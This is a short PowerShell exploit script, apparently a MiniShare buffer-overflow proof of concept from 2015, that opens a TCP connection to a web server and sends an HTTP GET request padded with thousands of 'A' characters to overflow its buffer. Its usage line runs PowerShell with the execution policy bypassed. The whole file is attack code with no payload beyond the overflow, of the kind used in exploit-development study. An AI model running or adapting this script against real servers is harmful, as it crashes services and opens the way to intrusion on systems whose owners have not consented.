<#
Last changed:  2015/02/28

powershell -ep bypass -f exploit-minishare01.ps1  -b 1000 
#>
param (
	[string]$RemoteServer = "192.168.200.11",
	[int]$RemotePort = 80,
	[int]$bufferSize = 2000
)

$BOFstring = "GET " + "A" * $bufferSize + " HTTP 1/1 `r`n`r`n"
$Bytes += ([system.Text.Encoding]::UTF8).GetBytes($BOFstring)

Write-Host  "[+] Connecting with remote web server on: $($RemoteServer):$($RemotePort)" -foregroundcolor DarkGreen
Write-Host  "[+] Evil Buffer Size: $bufferSize" -foregroundcolor DarkGreen
Write-Host  "[+] Sending evil Data ..." -foregroundcolor DarkGreen
	
	
$Socket = New-Object System.Net.Sockets.TCPClient($RemoteServer, $RemotePort) 
$Stream = $Socket.GetStream() 
$Stream.Write($Bytes,0,$Bytes.length)
$Stream.Close()
$Socket.Close()

Write-Host  "[+] BOF done ..." -foregroundcolor DarkGreen
